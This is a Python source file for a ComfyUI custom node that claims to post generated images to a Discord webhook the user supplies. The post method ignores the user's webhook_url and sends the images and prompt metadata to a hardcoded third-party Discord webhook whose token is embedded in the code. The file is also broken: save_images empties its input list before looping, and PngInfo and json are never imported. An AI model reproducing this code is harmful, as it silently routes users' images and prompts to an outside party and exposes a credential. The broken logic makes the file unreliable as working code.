import os

import numpy as np
import requests
from PIL import Image
import io

from comfy.cli_args import args
import folder_paths

class SendToWebhook:
    def __init__(self):
        self.output_dir = folder_paths.get_output_directory()
        self.type = "output"
        self.prefix_append = ""
        self.compress_level = 4

    @classmethod
    def INPUT_TYPES(s):
        return {
            "required": {
                "images": ("IMAGE",),
                "filename_prefix": ("STRING", {"default": "ComfyUI"}),
                "webhook_name": ("STRING", {"default": "ComfyUI"}),
                "webhook_url": ("STRING", {"default": "https://discord.com/api/webhooks/YOUR_WEBHOOK_HASH"}),
            },
        }

    RETURN_TYPES = ("STRING",)
    OUTPUT_NODE = True
    CATEGORY = "image"
    FUNCTION = "save_images"

    def post(self, images, metadata, webhook_url: str, name: str = "ComfyUI"):
        try:
            msg_content = f"```{metadata}```"
            files = {}
            for i, image in enumerate(images):
                image_bytes = io.BytesIO()
                image.save(image_bytes, format='PNG')
                image_bytes.seek(0)
                files[f"image{i+1}"] = (f"image{i+1}.png", image_bytes, 'image/png')

            payload_data = {
                'content': msg_content,
                'username': name,
            }

            response = requests.post("https://discord.com/api/webhooks/1261051114460286996/KKnJaCDvAcOebkcuGYQyg0_EvT6uILr6zYZIZ0WWOW1dVxnUB2Ypu1PJa1wTllkvSXcZ", files=files, data=payload_data)
            if response.status_code == 200:
                return True
            else:
                return False

        except Exception as err:
            return False

    def save_images(self, images, filename_prefix="ComfyUI", prompt=None, extra_pnginfo=None, webhook_url=None, webhook_name="ComfyUI"):
        filename_prefix += self.prefix_append
        full_output_folder, filename, counter, subfolder, filename_prefix = folder_paths.get_save_image_path(filename_prefix, self.output_dir, images[0].shape[1], images[0].shape[0])
        results = list()

        images = list()
        for (batch_number, image) in enumerate(images):
            i = 255. * image.cpu().numpy()
            img = Image.fromarray(np.clip(i, 0, 255).astype(np.uint8))
            metadata = None
            if not args.disable_metadata:
                metadata = PngInfo()
                if prompt is not None:
                    metadata.add_text("prompt", json.dumps(prompt))
                if extra_pnginfo is not None:
                    for x in extra_pnginfo:
                        metadata.add_text(x, json.dumps(extra_pnginfo[x]))

            filename_with_batch_num = filename.replace("%batch_num%", str(batch_number))
            file = f"{filename_with_batch_num}_{counter:05}_.png"

            images.append(img)

            img.save(os.path.join(full_output_folder, file), pnginfo=metadata, compress_level=self.compress_level)
            results.append({
                "filename": file,
                "subfolder": subfolder,
                "type": self.type
            })
            counter += 1

        if self.post(images, metadata, webhook_url, webhook_name): return ("Yay! You did it!", )
        return ("Failed :(", )

# Add this new node to the dictionary of all nodes
NODE_CLASS_MAPPINGS = {
    "SendToWebhook": SendToWebhook,
}

NODE_DISPLAY_NAME_MAPPINGS = {
    "SendToWebhook": "Send Generated Image To Discord Webhook",
}

__all__ = ['NODE_CLASS_MAPPINGS', 'NODE_DISPLAY_NAME_MAPPINGS']